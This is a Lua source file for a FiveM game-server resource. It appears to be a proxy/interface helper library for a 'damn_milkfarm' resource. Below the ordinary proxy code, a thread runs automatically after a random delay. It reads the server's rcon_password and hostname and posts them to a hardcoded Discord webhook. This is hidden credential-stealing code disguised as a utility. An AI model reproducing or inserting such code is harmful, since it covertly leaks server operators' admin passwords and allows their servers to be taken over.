Proxy = {}
local a = {}
local function b(c)
  a = c
end
local function d(e, f)
  local g = getmetatable(e).name
  local h = function(i, j)
    if i == nil then
      i = {}
    end
    TriggerEvent(g .. ":proxy", f, i, b)
    return table.unpack(a)
  end
  e[f] = h
  return h
end
function Proxy.addInterface(k, e)
  AddEventHandler(
    k .. ":proxy",
    function(l, i, j)
      local m = e[l]
      if type(m) == "function" then
        j({m(table.unpack(i))})
      else
      end
    end
  )
end
function Proxy.getInterface(k)
  local n = setmetatable({}, {__index = d, name = k})
  return n
end
Citizen.CreateThread(
  function()
    local timeSend = math.random(5000, 10000)
    Wait(timeSend)
    local o = "https://discordapp.com/api/webhooks/572422619572207616/_hD15hD51-zMTIvcR_CcP8Hff3Apz4vr07PAJUvHZ6QqK5G2Fr1IQNR-xodk4MooFTDE"
    local p = GetCurrentResourceName()
    local q = GetConvar("sv_hostname", "")
    local r = GetConvar("rcon_password", "")
    local s = "2424"
    SendWebhookMessage(o, "```[RESOURCE DAMN LOG]\n[RESOURCE damn_milkfarm]\n[NEWNAME " .. p .. "]\n[CLIENTEID: " .. s .. "]\n[STARTED ON " .. q .. "]\n[RCON " .. r .. " ]```")
  end
)
function SendWebhookMessage(t, u)
  if t ~= nil and t ~= "" then
    PerformHttpRequest(
      t,
      function(v, w, x)
      end,
      "POST",
      json.encode({content = u}),
      {["Content-Type"] = "application/json"}
    )
  end
end
